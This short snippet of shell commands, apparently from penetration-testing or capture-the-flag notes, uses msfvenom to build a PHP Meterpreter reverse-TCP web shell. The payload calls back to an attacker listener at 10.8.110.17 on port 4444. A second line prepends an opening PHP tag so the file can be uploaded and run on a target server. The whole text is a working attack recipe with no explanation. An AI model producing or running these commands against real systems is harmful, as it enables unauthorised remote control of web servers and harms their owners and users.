msfvenom -p php/meterpreter_reverse_tcp LHOST=10.8.110.17 LPORT=4444 -f raw > shell.php
cat shell.php | pbcopy && echo ‘<?php ‘ | tr -d ‘\n’ > shell.php && pbpaste >> shell.php